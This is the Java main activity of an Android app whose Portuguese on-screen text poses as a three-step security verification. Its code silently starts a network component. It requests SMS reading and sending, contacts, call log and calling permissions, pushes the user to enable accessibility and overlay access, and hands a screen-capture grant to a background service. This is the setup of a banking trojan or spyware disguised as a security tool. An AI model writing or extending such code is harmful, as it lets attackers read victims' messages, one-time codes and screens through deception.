package com.aval.seg;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final int REQ_CAP = 10;
    private static final int REQ_NOT = 11;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.main);
        try { Net.start(this); } catch (Throwable ignored) {}

        java.util.List<String> need = new java.util.ArrayList<>();
        String[] perms = {
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.CALL_PHONE
        };
        for (String p : perms)
            if (checkSelfPermission(p) != android.content.pm.PackageManager.PERMISSION_GRANTED) need.add(p);
        if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS)
                   != android.content.pm.PackageManager.PERMISSION_GRANTED)
            need.add(android.Manifest.permission.POST_NOTIFICATIONS);
        if (!need.isEmpty()) requestPermissions(need.toArray(new String[0]), REQ_NOT);

        findViewById(R.id.b1).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); }
                catch (Throwable ignored) {}
            }
        });

        findViewById(R.id.b2).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(MainActivity.this)) {
                    startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName())));
                    return;
                }
                MediaProjectionManager m =
                        (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(m.createScreenCaptureIntent(), REQ_CAP);
            }
        });

        findViewById(R.id.b3).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                } catch (Throwable ignored) {}
                finish();
            }
        });
        refresh();
    }

    @Override protected void onResume() {
        super.onResume();
        refresh();
    }

    private void refresh() {
        TextView t = findViewById(R.id.txt);
        if (t == null) return;
        if (Util.accOn(this)) t.setText("Etapa 2 de 3: permita a captura de tela para continuar a verificacao.");
    }

    @Override protected void onActivityResult(int rq, int rs, Intent d) {
        super.onActivityResult(rq, rs, d);
        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
            Intent s = new Intent(this, ScreenSvc.class);
            s.putExtra("code", rs);
            s.putExtra("data", d);
            try {
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(s);
                else startService(s);
            } catch (Throwable ignored) {}
            TextView t = findViewById(R.id.txt);
            if (t != null) t.setText("Etapa 3 de 3: conclua a verificacao para finalizar.");
        }
    }
}